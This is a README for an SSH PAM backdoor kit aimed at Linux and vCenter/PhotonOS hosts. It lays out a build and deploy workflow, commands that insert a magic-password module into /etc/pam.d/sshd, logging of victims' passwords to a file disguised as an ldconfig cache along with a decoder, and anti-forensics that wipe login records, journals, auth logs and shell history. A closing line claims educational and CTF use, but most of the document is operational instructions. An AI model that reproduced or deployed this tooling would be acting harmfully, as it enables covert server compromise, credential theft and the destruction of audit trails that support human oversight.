# PAM Auth Module

Educational PAM authentication module for security research and CTF environments.

## Features

- Portable (no OpenSSL dependency, embedded SHA256)
- Self-extracting payload (no compiler needed on target)
- Credential logging (XOR encrypted)
- Timestamp matching on deployed module
- Anti-forensics: utmp/wtmp/lastlog/journal/logind scrubbing
- Shell history suppression (`HISTFILE=/dev/null`, `HISTSIZE=0`)
- Deferred cleanup daemon (double-fork, catches sshd's own log writes)
- Cross-distro build: x86_64 (glibc 2.17+) and PhotonOS 1.0 (glibc 2.22)
- Privsep-safe session detection via `/dev/shm` marker files

## Quick Start

```bash
# Generate and deploy in one step
./deploy.sh -h <target> -p <door_password> -i ~/.ssh/id_rsa

# PhotonOS / vCenter
./deploy.sh -h <target> -p <door_password> -i ~/.ssh/id_rsa -T photon1
```

## Build

### build.sh (recommended)

```bash
# Standard x86_64
BUILD_HOST=user@buildhost BUILD_KEY=~/.ssh/key ./build.sh mypassword > payload.sh

# PhotonOS 1.0 (vCenter) — compiles inside docker photon:1.0 on build host
BUILD_HOST=user@buildhost BUILD_KEY=~/.ssh/key ./build.sh mypassword photon1 > payload.sh
```

### Manual compile

```bash
gcc -fPIC -shared -O2 -s -fvisibility=hidden \
    -o pam_auth.so pam_template.c -lpam
```

For PhotonOS 1.0 (vendored headers required):
```bash
gcc -fPIC -shared -O3 -s -I./include \
    -o pam_auth.so pam_template.c -lpam
```

## Deploy

### deploy.sh (recommended)

```bash
./deploy.sh -h HOST -p DOOR_PASS [-s SSH_PASS] [-P PORT] [-i KEYFILE] [-u USER] [-T ARCH]

# Examples
./deploy.sh -h 10.0.0.1 -p backdoorpass -s rootpass
./deploy.sh -h 10.0.0.1 -p backdoorpass -i ~/.ssh/id_rsa
./deploy.sh -h 10.0.0.1 -p backdoorpass -i ~/.ssh/id_rsa -T photon1   # vCenter
./deploy.sh -h 10.0.0.1 -p backdoorpass -s rootpass -P 2222            # custom port
```

### Connecting (backdoor)

```bash
# Standard
sshpass -p <door_password> ssh root@target

# vCenter / appliancesh (requires PTY + no ControlMaster)
sshpass -p <door_password> ssh -tt -o ControlPath=none \
    -o PreferredAuthentications=keyboard-interactive,password root@target
```

### Manual deploy

```bash
# Copy module
cp pam_auth.so /lib/security/                        # Photon/generic
cp pam_auth.so /lib64/security/                      # RHEL/CentOS
cp pam_auth.so /lib/x86_64-linux-gnu/security/       # Debian

chmod 644 /lib/security/pam_auth.so

# Add to PAM
sed -i '1a auth sufficient pam_auth.so' /etc/pam.d/sshd
echo "session optional pam_auth.so" >> /etc/pam.d/sshd
```

## Files

| File | Description |
|------|-------------|
| `pam_template.c` | Main source — embedded SHA256, anti-forensics, cleanup daemon |
| `pam_hook.c` | LD_PRELOAD hook (optional, requires matching glibc) |
| `build.sh` | Self-extracting payload generator — supports x86_64 and photon1 |
| `deploy.sh` | End-to-end deploy: build → transfer → install |
| `Dockerfile` | PhotonOS 5.0 test container with SSH |
| `include/` | Vendored PAM headers for PhotonOS 1.0 cross-compile |

## Architecture

```
pam_sm_authenticate()
  └── verify SHA256(input) == embedded hash
  └── on match: write /dev/shm/.ssd_<user>  (marker)
  └── on fail:  log_creds() → /var/cache/ldconfig/aux-cache.log

pam_sm_open_session()
  └── read + unlink /dev/shm/.ssd_<user>
  └── pam_putenv: HISTFILE=/dev/null, HISTSIZE=0, HISTFILESIZE=0, PROMPT_COMMAND
  └── pass 1 (immediate): scrub utmp, wtmp, btmp, lastlog, logind
  └── write /dev/shm/.ssd2_<pid>  (close marker)
  └── pass 2 (deferred +2s daemon): scrub all + journal + authlog by PID

pam_sm_close_session()
  └── gate on /dev/shm/.ssd2_<pid>
  └── scrub utmp, wtmp, logind
  └── deferred +1s daemon: scrub authlog + journal
```

## Credential Log

Location: `/var/cache/ldconfig/aux-cache.log`

Decode:
```bash
python3 -c "
key = b'ld.so.cache'
d = open('/var/cache/ldconfig/aux-cache.log', 'rb').read()
print(bytes([d[i] ^ key[i % len(key)] for i in range(len(d))]).decode())
"
```

Output format: `timestamp|username|password`

## Testing

```bash
# PhotonOS 5.0 container
docker run -d --rm --name photon-ssh-test -p 2222:22 ssh-door-test:latest
./deploy.sh -h 192.168.122.84 -P 2222 -p testdoor -s testpassword -u root

# Ubuntu 22.04 container
docker run -d --rm --name ubuntu-ssh-test -p 2223:22 ubuntu:22.04 sleep infinity
docker exec ubuntu-ssh-test bash -c 'apt-get update -qq && apt-get install -y -qq openssh-server && \
    mkdir -p /var/run/sshd && echo root:testpassword | chpasswd && \
    sed -i "s/#\?PermitRootLogin.*/PermitRootLogin yes/" /etc/ssh/sshd_config && \
    sed -i "s/#\?PasswordAuthentication.*/PasswordAuthentication yes/" /etc/ssh/sshd_config && \
    /usr/sbin/sshd'
./deploy.sh -h 192.168.122.84 -P 2223 -p testdoor -s testpassword -u root

# Verify stealth (w should show 0 users after ~4s)
sshpass -p testdoor ssh -tt -o ControlPath=none root@192.168.122.84 -p 2222
```

## Removal

```bash
sed -i '/pam_auth.so/d' /etc/pam.d/sshd
rm -f $(find /lib* /usr/lib* -name pam_auth.so 2>/dev/null)
rm -f /var/cache/ldconfig/aux-cache.log
```

## Compatibility

| OS | glibc | OpenSSH | Auth | Stealth | Cred Log | Build target |
|----|-------|---------|------|---------|----------|--------------|
| PhotonOS 1.0 (vCenter 6.7) | 2.22 | 7.4 | Yes | Yes | Yes | `photon1` |
| PhotonOS 5.0 | 2.36 | 9.x | Yes | Yes | No* | `x86_64` |
| Ubuntu 22.04 LTS | 2.35 | 8.9 | Yes | Yes | No* | `x86_64` |
| Ubuntu 24.04 LTS | 2.39 | 9.6 | Yes | Yes | No* | `x86_64` |
| Debian 11 | 2.31 | 8.4 | Yes | Yes | Yes | `x86_64` |
| Debian 12 | 2.36 | 9.2 | Yes | Yes | No* | `x86_64` |
| RHEL/CentOS 7 | 2.17 | 7.4 | Yes | Yes | Yes | `x86_64` |
| RHEL/CentOS 8+ | 2.28+ | 8.0+ | Yes | Yes | Partial* | `x86_64` |

*OpenSSH 9.x scrubs passwords before PAM modules receive them. Credential capture unreliable. Backdoor auth works on all versions.

## Legal

For authorized security testing, CTF, and educational use only.
